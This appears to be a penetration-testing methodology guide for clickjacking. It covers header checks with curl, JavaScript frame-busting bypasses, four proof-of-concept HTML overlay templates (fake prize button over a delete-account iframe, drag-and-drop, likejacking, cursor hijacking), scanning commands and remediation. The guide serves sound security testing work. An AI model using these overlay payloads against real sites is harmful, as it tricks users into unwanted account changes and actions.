# Clickjacking / UI Redressing Testing

## Overview
Clickjacking (UI Redressing) tricks users into clicking on hidden or disguised elements by overlaying a transparent iframe of a target site over attacker-controlled content. Victims believe they are interacting with the visible page, but their clicks are captured by the hidden iframe, triggering unintended actions on the target application.

## Classification
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
- **OWASP:** A01:2021 - Broken Access Control
- **CVSS Base:** 4.3 - 6.5

## Detection Methodology

### 1. Check X-Frame-Options Header
```bash
curl -s -D- -o /dev/null https://target.com/ | grep -i "x-frame-options"

# Secure values:
# X-Frame-Options: DENY               → Cannot be framed at all
# X-Frame-Options: SAMEORIGIN         → Only same-origin framing
# X-Frame-Options: ALLOW-FROM uri     → Deprecated, limited browser support

# Vulnerable: Header absent or misconfigured
```

### 2. Check Content-Security-Policy frame-ancestors
```bash
curl -s -D- -o /dev/null https://target.com/ | grep -i "content-security-policy"

# Secure values:
# Content-Security-Policy: frame-ancestors 'none';         → No framing
# Content-Security-Policy: frame-ancestors 'self';         → Same-origin only
# Content-Security-Policy: frame-ancestors https://trusted.com;

# Vulnerable: Directive absent, wildcard, or overly permissive
```

### 3. Identify Sensitive Frameable Actions
Target pages with state-changing single-click actions:
- Delete account / data
- Change email / password
- Enable / disable 2FA
- Grant permissions / change roles
- Accept friend request / follow
- Transfer funds
- Approve OAuth authorization
- Toggle security settings
- Purchase / subscribe actions

### 4. Test Framing Behavior
```bash
# Quick iframe test
echo '<html><body><iframe src="https://target.com/settings" width="800" height="600"></iframe></body></html>' > /tmp/clickjack_test.html

# Check if the page renders in iframe
# If it loads → vulnerable to clickjacking
```

### 5. JavaScript Frame-Busting Bypass
Some sites use JavaScript frame-busting that can be bypassed:
```html
<!-- Disable JavaScript frame-busting with sandbox -->
<iframe sandbox="allow-forms" src="https://target.com/delete-account"></iframe>

<!-- Double framing (bypass if checking top !== self) -->
<iframe src="outer.html">
  <!-- outer.html contains: <iframe src="https://target.com/action"> -->
</iframe>

<!-- onbeforeunload handler to prevent navigation -->
<script>
  window.onbeforeunload = function() { return "Stay on page?"; };
</script>
<iframe src="https://target.com/settings"></iframe>
```

## PoC Templates

### Basic Clickjacking PoC
```html
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Click the button below to win a prize!</h1>
<div style="position: relative; width: 500px; height: 200px;">
  <!-- Decoy button visible to user -->
  <button style="position: absolute; top: 80px; left: 100px; z-index: 1;
    padding: 15px 30px; font-size: 18px; cursor: pointer;">
    Claim Prize!
  </button>
  <!-- Hidden target iframe -->
  <iframe src="https://target.com/delete-account"
    style="position: absolute; top: 0; left: 0; width: 500px; height: 200px;
    opacity: 0.0001; z-index: 2; border: none;">
  </iframe>
</div>
</body>
</html>
```

### Multi-Step Clickjacking (Drag-and-Drop)
```html
<html>
<head><title>Multi-Step Clickjacking</title></head>
<body>
<div style="position: relative;">
  <iframe id="target" src="https://target.com/settings"
    style="position: absolute; opacity: 0.0001; z-index: 2;
    width: 800px; height: 600px; border: none;">
  </iframe>
  <!-- Step 1: Click to open dropdown -->
  <button style="position: absolute; top: 150px; left: 200px; z-index: 1;">
    Step 1: Click Here
  </button>
  <!-- Step 2: Click to confirm -->
  <button style="position: absolute; top: 250px; left: 200px; z-index: 1;">
    Step 2: Confirm
  </button>
</div>
</body>
</html>
```

### Likejacking (Social Media)
```html
<html>
<body>
<div style="position: relative; overflow: hidden; width: 60px; height: 30px;">
  <iframe src="https://target.com/like?post=12345"
    style="position: absolute; top: -200px; left: -50px;
    width: 500px; height: 500px; opacity: 0.0001; border: none;">
  </iframe>
  <button style="position: relative; z-index: 1;">Play Video</button>
</div>
</body>
</html>
```

### Cursor Hijacking PoC
```html
<html>
<body style="cursor: none;">
<div id="fakeCursor" style="position: absolute; z-index: 9999;
  pointer-events: none; width: 20px; height: 20px;">
  <img src="cursor.png">
</div>
<iframe src="https://target.com/confirm-action"
  style="opacity: 0.0001; position: absolute; top: 0; left: 0;
  width: 100%; height: 100%; border: none;">
</iframe>
<script>
  document.onmousemove = function(e) {
    // Offset the fake cursor so real click hits target element
    document.getElementById('fakeCursor').style.left = (e.clientX - 200) + 'px';
    document.getElementById('fakeCursor').style.top = (e.clientY - 100) + 'px';
  };
</script>
</body>
</html>
```

## Tool Usage
```bash
# Nuclei clickjacking detection
nuclei -u https://target.com -t http/misconfiguration/clickjacking/ -batch

# Bulk header check with curl
for url in $(cat urls.txt); do
  echo "=== $url ==="
  curl -s -D- -o /dev/null "$url" | grep -iE "(x-frame-options|frame-ancestors)"
done

# Burp Suite: Burp Clickbandit tool
# Target → Site map → right-click → Engagement tools → Clickbandit

# Check multiple pages for inconsistent framing policies
for path in "/" "/settings" "/profile" "/admin" "/api/docs"; do
  echo "--- $path ---"
  curl -s -D- -o /dev/null "https://target.com$path" \
    | grep -iE "(x-frame-options|content-security-policy)"
done
```

## Remediation
1. **Set X-Frame-Options** -- use `DENY` or `SAMEORIGIN` on all responses
2. **Use CSP frame-ancestors** -- `Content-Security-Policy: frame-ancestors 'none'` (preferred over X-Frame-Options)
3. **Apply to all pages** -- ensure framing protections are on every response, not just the homepage
4. **Avoid ALLOW-FROM** -- deprecated, use CSP frame-ancestors instead
5. **Supplement with JavaScript** -- use `if (self !== top) { top.location = self.location; }` as defense-in-depth only (not sole protection)
6. **Use SameSite cookies** -- `SameSite=Strict` or `Lax` prevents cookies in framed contexts
7. **Require confirmation** -- add re-authentication or CAPTCHA for destructive actions

## Evidence Collection
- Missing or misconfigured X-Frame-Options and CSP frame-ancestors headers
- Screenshot or recording of working PoC with iframe overlay
- Specific action that can be triggered via clickjacking
- List of frameable pages with sensitive functionality
- Impact assessment (what actions can be performed without user awareness)
- Browser versions tested
